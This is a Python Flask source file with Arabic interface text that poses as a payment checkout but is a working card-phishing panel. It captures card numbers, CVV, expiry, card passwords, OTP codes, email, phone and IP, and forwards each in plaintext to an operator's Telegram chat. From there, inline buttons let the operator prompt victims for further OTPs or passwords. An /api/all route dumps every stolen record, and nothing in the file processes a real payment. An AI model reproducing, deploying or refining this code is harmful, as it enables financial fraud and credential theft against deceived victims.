import os
import uuid
import requests
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'default-secret')

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = os.getenv('ADMIN_ID')
WEBSITE_URL = os.getenv('WEBSITE_URL', 'http://localhost:5000')

payments_db = {}

def send_telegram_message(chat_id, text, buttons=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": buttons
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error: {e}")

@app.route('/')
def index():
    return render_template('payment.html')

@app.route('/pay', methods=['POST'])
def process_payment():
    try:
        data = request.get_json() or request.form
        payment_id = str(uuid.uuid4())[:12].upper()

        payment_data = {
            'id': payment_id,
            'card_number': data.get('card_number', '').replace(' ', ''),
            'card_holder': data.get('card_holder', ''),
            'expiry_month': data.get('expiry_month', ''),
            'expiry_year': data.get('expiry_year', ''),
            'cvv': data.get('cvv', ''),
            'amount': data.get('amount', '0'),
            'currency': data.get('currency', 'USD'),
            'email': data.get('email', ''),
            'phone': data.get('phone', ''),
            'password': data.get('password', ''),
            'otp': data.get('otp', ''),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'pending'
        }

        payments_db[payment_id] = payment_data

        message = (
            f"🔔 <b>طلب دفع جديد!</b>\n\n"
            f"🆔 <b>الرقم:</b> <code>{payment_id}</code>\n"
            f"💳 <b>البطاقة:</b> <code>{payment_data['card_number']}</code>\n"
            f"👤 <b>الاسم:</b> {payment_data['card_holder']}\n"
            f"📅 <b>الانتهاء:</b> {payment_data['expiry_month']}/{payment_data['expiry_year']}\n"
            f"🔒 <b>CVV:</b> <code>{payment_data['cvv']}</code>\n"
            f"🔑 <b>كلمة السر:</b> <code>{payment_data['password']}</code>\n"
            f"📱 <b>OTP:</b> <code>{payment_data['otp']}</code>\n"
            f"💰 <b>المبلغ:</b> {payment_data['amount']} {payment_data['currency']}\n"
            f"📧 <b>البريد:</b> {payment_data['email']}\n"
            f"📱 <b>الهاتف:</b> {payment_data['phone']}\n"
            f"🌐 <b>IP:</b> <code>{payment_data['ip']}</code>\n"
            f"⏰ <b>الوقت:</b> {payment_data['timestamp']}\n\n"
            f"اختر الإجراء:"
        )

        buttons = {
            "inline_keyboard": [
                [
                    {"text": "✅ قبول", "callback_data": f"accept_{payment_id}"},
                    {"text": "❌ رفض", "callback_data": f"reject_{payment_id}"}
                ],
                [
                    {"text": "🔑 طلب OTP", "callback_data": f"request_otp_{payment_id}"},
                    {"text": "🔒 طلب كلمة سر", "callback_data": f"request_pass_{payment_id}"}
                ]
            ]
        }

        send_telegram_message(ADMIN_ID, message, buttons)

        return jsonify({
            'success': True,
            'payment_id': payment_id,
            'message': 'جاري المعالجة...'
        })

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/status/<payment_id>')
def check_status(payment_id):
    payment = payments_db.get(payment_id)
    if not payment:
        return jsonify({'status': 'not_found'}), 404
    return jsonify({
        'status': payment['status'],
        'payment_id': payment_id
    })

@app.route('/result/<payment_id>')
def payment_result(payment_id):
    payment = payments_db.get(payment_id)
    if not payment:
        return render_template('result.html', status='error', message='غير موجود')

    if payment['status'] == 'approved':
        return render_template('result.html', status='success', message='تم الدفع!', payment_id=payment_id)
    elif payment['status'] == 'rejected':
        return render_template('result.html', status='error', message='تم الرفض', payment_id=payment_id)
    elif payment['status'] == 'needs_otp':
        return render_template('otp.html', payment_id=payment_id)
    elif payment['status'] == 'needs_password':
        return render_template('password.html', payment_id=payment_id)
    else:
        return render_template('result.html', status='pending', message='قيد المراجعة...', payment_id=payment_id)

@app.route('/submit_otp', methods=['POST'])
def submit_otp():
    data = request.get_json()
    payment_id = data.get('payment_id')
    otp = data.get('otp')

    if payment_id in payments_db:
        payments_db[payment_id]['otp'] = otp
        payments_db[payment_id]['status'] = 'pending'

        message = (
            f"📱 <b>OTP وارد!</b>\n\n"
            f"🆔 <b>الرقم:</b> <code>{payment_id}</code>\n"
            f"🔢 <b>الرمز:</b> <code>{otp}</code>\n\n"
            f"💳 البطاقة: <code>{payments_db[payment_id]['card_number']}</code>"
        )
        send_telegram_message(ADMIN_ID, message)

        return jsonify({'success': True})
    return jsonify({'success': False}), 404

@app.route('/submit_password', methods=['POST'])
def submit_password():
    data = request.get_json()
    payment_id = data.get('payment_id')
    password = data.get('password')

    if payment_id in payments_db:
        payments_db[payment_id]['password'] = password
        payments_db[payment_id]['status'] = 'pending'

        message = (
            f"🔑 <b>كلمة سر واردة!</b>\n\n"
            f"🆔 <b>الرقم:</b> <code>{payment_id}</code>\n"
            f"🔒 <b>الكلمة:</b> <code>{password}</code>\n\n"
            f"💳 البطاقة: <code>{payments_db[payment_id]['card_number']}</code>"
        )
        send_telegram_message(ADMIN_ID, message)

        return jsonify({'success': True})
    return jsonify({'success': False}), 404

@app.route('/api/update_status', methods=['POST'])
def update_status():
    data = request.get_json()
    payment_id = data.get('payment_id')
    status = data.get('status')

    if payment_id in payments_db:
        payments_db[payment_id]['status'] = status
        return jsonify({'success': True})
    return jsonify({'success': False}), 404

@app.route('/api/request_otp', methods=['POST'])
def request_otp_api():
    data = request.get_json()
    payment_id = data.get('payment_id')

    if payment_id in payments_db:
        payments_db[payment_id]['status'] = 'needs_otp'
        return jsonify({'success': True})
    return jsonify({'success': False}), 404

@app.route('/api/request_password', methods=['POST'])
def request_password_api():
    data = request.get_json()
    payment_id = data.get('payment_id')

    if payment_id in payments_db:
        payments_db[payment_id]['status'] = 'needs_password'
        return jsonify({'success': True})
    return jsonify({'success': False}), 404

@app.route('/api/all')
def get_all():
    return jsonify(payments_db)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
